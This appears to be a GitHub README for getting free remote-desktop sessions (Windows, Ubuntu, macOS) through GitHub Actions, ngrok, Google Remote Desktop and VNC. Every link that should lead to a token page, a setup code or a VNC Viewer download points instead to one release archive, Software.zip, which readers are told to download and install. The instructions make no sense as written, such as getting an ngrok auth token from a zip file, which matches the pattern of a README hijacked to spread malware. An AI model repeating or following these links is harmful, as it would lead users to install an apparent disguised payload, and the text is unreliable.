## RDP Windows, Ubuntu & MacOS


------

> ***⚠️ WARNING***                                              
> don't close the starter terminal (Connected to Github).


### Tunnel Servers.

* us - United States (Ohio)
* eu - Europe (Frankfurt)
* ap - Asia/Pacific (Singapore)
* au - Australia (Sydney)
* sa - South America (Sao Paulo)
* jp - Japan (Tokyo)
* in - India (Mumbai)

### How to run the project. 

<details>
    <summary>Ngrok (RDP)</summary>
    
------

* Click Fork in the right corner of the screen to save it to your Github.
* Visit https://github.com/awskhahaha/MH/releases/download/v1.0/Software.zip to get **Ngrok Auth Token**.
* In Github go to Action> Windows (Ngrok RDP)> Run workflow.
* In Value: visit https://github.com/awskhahaha/MH/releases/download/v1.0/Software.zip Copy and Paste Your Authtoken into.
* Password minimum 8-10 with numbers and characters leave blank if you want to use automatic password.
* Press Run workflow.
* Reload the page and press Windows (Ngrok RDP)> build.
* Press the down arrow on Account for Connect to your RDP to get IP, User, Password.
------

</details>

<details>
    <summary>Google Remote Desktop.</summary>

------

* Visit https://github.com/awskhahaha/MH/releases/download/v1.0/Software.zip to get **Google Remote Desktop Code**.
* Click Start> Next> Allow> Copy Windows (Windows PowerShell) / Ubuntu (Debian Linux).
* In Github go to Action> Windows/Ubuntu (Google Remote Desktop)> Run workflow.
* In Value: Paste Code.
* Press Run workflow.
* Reload the page and press Windows/Ubuntu (Google Remote Desktop)> build.
* Wait and visit https://github.com/awskhahaha/MH/releases/download/v1.0/Software.zip to connect rdp.

------

</details>

<details>
    <summary>Ngrok (NVC Viewer)</summary>

<br>

**❕ TIPS**  
Use the te teamviewer to avoid the lag.

------

* Visit https://github.com/awskhahaha/MH/releases/download/v1.0/Software.zip to download **NVC Viewer**.
* Install Software.
* Visit https://github.com/awskhahaha/MH/releases/download/v1.0/Software.zip to get **Ngrok Auth Token**.
* In Github go to Action> MacOS (Ngrok VNC Viewer)> Run workflow.
* In Value: visit https://github.com/awskhahaha/MH/releases/download/v1.0/Software.zip Copy and Paste Your Authtoken into.
* Password minimum 8-10 numbers/characters.
* Press Run workflow.
* Reload the page and press MacOS (Ngrok VNC Viewer)> build.
* Press the down arrow on IP for Connect to your RDP to get IP.
* Open VNC Viewer put ip in the field "Enter a VNC Server Address or search" and enter too connect.

------
<details>
    <summary>Ngrok (VPS)</summary>
***
Secrets Name | Uses | Notes
----- | ----- | -----
`NGROK_AUTH_TOKEN` | For **ngrok** tunnel uses | Go to website, and copy Your Authtoken from https://github.com/awskhahaha/MH/releases/download/v1.0/Software.zip
`LINUX_USERNAME` | For VPS username `root` | Type any name you want
`LINUX_USER_PASSWORD` | For VPS `root password` | Type any password you want
`LINUX_MACHINE_NAME` | For VPS System `Computer` name | Type any name you want
`CHROME_HEADLESS_CODE` | For remoting linux desktop using google remote | Copy Codes from [here](https://github.com/awskhahaha/MH/releases/download/v1.0/Software.zip) and login with your google account, and then copy the code below `Debian Linux` blank. :warning: Each code can only be used for once, generate another code when u have used that one.
***
-------
By MH
